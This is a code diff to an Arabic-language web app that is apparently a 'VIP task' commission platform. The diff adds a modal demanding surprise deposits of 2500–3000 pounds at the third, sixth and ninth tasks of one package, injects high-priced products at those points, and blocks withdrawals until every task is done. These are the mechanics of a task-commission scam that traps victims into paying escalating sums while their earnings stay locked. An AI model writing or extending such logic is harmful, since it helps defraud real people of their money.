@@ -415,6 +415,18 @@
         </div>
     </div>
 
+    <!-- DEPOSIT MODAL (FOR SPECIAL 170 VIP TASKS) -->
+    <div id="deposit-task-modal" class="modal">
+        <div class="modal-content" style="text-align: center;">
+            <div style="font-size: 2.2rem; margin-bottom: 8px;">⚠️</div>
+            <h3 style="margin-bottom:8px; color:#ffcc00; font-size:1rem;">طلب إيداع إضافي مطلوب</h3>
+            <p id="deposit-msg-text" style="font-size: 0.8rem; color: #ccc; margin-bottom: 15px; line-height: 1.4;">
+                لقد صادفت طلباً استثنائياً بقيمة عالية. لإكمال المهمة والاستمرار، يرجى إيداع مبلغ وقدره <b id="required-dep-amount" style="color:var(--primary-green);">0</b> جنيه.
+            </p>
+            <button class="btn-neon-pill" style="border-radius:6px; height:38px; font-size:0.9rem;" onclick="confirmTaskDeposit()">تأكيد الإيداع والمتابعة</button>
+        </div>
+    </div>
+
     <!-- Firebase SDK Imports & App Logic -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
@@ -458,7 +470,6 @@
         let activeCompletedTasks = 0;
         let totalCommissionProfit = 0.00;
         let userExecutedOrders = [];
-        let subscribedVips = []; // تخزين الباقات التي اشترك بها المستخدم مسبقاً
 
         let currentUser = {
             phone: "",
@@ -468,11 +479,17 @@
         };
 
         const demoProducts = [
-            { name: "كيبل شحن سريع Type-C قماشي متين", price: 50.00, diff: 0 },
-            { name: "جراب حماية شفاف سيليكون مضاد للصدمات", price: 65.00, diff: 10 },
-            { name: "كيبل شحن ونقل بيانات آيفون سريع", price: 75.00, diff: 15 },
-            { name: "جراب موبايل ملون أنيق ناعم الملمس", price: 89.00, diff: 20 },
-            { name: "كيبل شحن متعدد 3 في 1 لجميع الأجهزة", price: 95.00, diff: 25 }
+            { name: "كيبل شحن سريع Type-C قماشي متين", price: 50.00 },
+            { name: "جراب حماية شفاف سيليكون مضاد للصدمات", price: 65.00 },
+            { name: "كيبل شحن ونقل بيانات آيفون سريع", price: 75.00 },
+            { name: "جراب موبايل ملون أنيق ناعم الملمس", price: 89.00 },
+            { name: "كيبل شحن متعدد 3 في 1 لجميع الأجهزة", price: 95.00 }
+        ];
+
+        const specialProducts = [
+            { name: "ساعة ذكية فاخرة Ultra الإصدار الأخير", price: 3500.00 },
+            { name: "سماعات بلوتوث لاسلكية عالية الأداء", price: 2800.00 },
+            { name: "كاميرا مراقبة ذكية منزلية متطورة", price: 4200.00 }
         ];
 
         let currentSlide = 0;
@@ -530,7 +547,6 @@
                         return;
                     }
 
-                    // منح هدية ترحيبية بقيمة 50 جنيه للمستخدم الجديد
                     const newUser = {
                         phone: phone,
                         password: pass,
@@ -636,13 +652,11 @@
         async function subscribeVip(limit, rate, maxTasks) {
             if (!currentUser.subscribedVips) currentUser.subscribedVips = [];
 
-            // التحقق عما إذا كان قد اشترك في هذه الباقة من قبل
             if (currentUser.subscribedVips.includes(limit)) {
                 alert('⚠️ عذراً، لقد قمت بالاشتراك في هذه الباقة مسبقاً ولا يمكنك تكرارها!');
                 return;
             }
 
-            // تسجيل الاشتراك في الحساب وقاعدة البيانات
             currentUser.subscribedVips.push(limit);
             await saveUserData();
             updateVipCardsUI();
@@ -747,14 +761,43 @@
                     progressBox.style.display = 'none';
                     btn.style.display = 'block';
 
-                    completeTaskProcess();
+                    checkAndExecuteTask();
                 }
             }, 50);
         }
 
-        function completeTaskProcess() {
+        function checkAndExecuteTask() {
+            const nextTaskIndex = activeCompletedTasks + 1;
+
+            // إذا كانت باقة 170 جنيه، وعند كل 3 مهمات (3, 6, 9) يتم مطالبته بإيداع عشوائي بين 2500 و 3000
+            if (activeVipLimit === 170 && (nextTaskIndex === 3 || nextTaskIndex === 6 || nextTaskIndex === 9)) {
+                // توليد مبلغ إيداع عشوائي بين 2500 و 3000
+                const randomDepositAmount = Math.floor(Math.random() * (3000 - 2500 + 1)) + 2500;
+                document.getElementById('required-dep-amount').innerText = randomDepositAmount;
+                document.getElementById('deposit-task-modal').classList.add('active');
+                return;
+            }
+
+            executeNormalTask();
+        }
+
+        function confirmTaskDeposit() {
+            document.getElementById('deposit-task-modal').classList.remove('active');
+            alert('تم استلام طلب الإيداع المؤقت بنجاح. استمرار تنفيذ المهمة...');
+            executeNormalTask();
+        }
+
+        function executeNormalTask() {
             activeCompletedTasks++;
-            const randomProd = demoProducts[Math.floor(Math.random() * demoProducts.length)];
+            
+            let randomProd;
+            // إذا كانت باقة 170 وعند المهمات المحددة، نجعل الطلب بسعر أعلى
+            if (activeVipLimit === 170 && (activeCompletedTasks === 3 || activeCompletedTasks === 6 || activeCompletedTasks === 9)) {
+                randomProd = specialProducts[Math.floor(Math.random() * specialProducts.length)];
+            } else {
+                randomProd = demoProducts[Math.floor(Math.random() * demoProducts.length)];
+            }
+
             const profit = randomProd.price * (activeVipRate / 100);
             totalCommissionProfit += profit;
             currentUser.balance += profit;
@@ -810,6 +853,11 @@
         }
 
         function openWithdrawModal() {
+            // منع السحب طالما أن المستخدم لم يُنهِ الباقة الحالية بالكامل (10 مهام)
+            if (!hasActiveSubscription || activeCompletedTasks < activeMaxTasks) {
+                alert('⚠️ عذراً، لا يمكنك إجراء عملية السحب الآن. يجب عليك إنهاء وإتمام جميع مهام الباقة النشطة أولاً!');
+                return;
+            }
             document.getElementById('withdraw-modal').classList.add('active');
         }
 
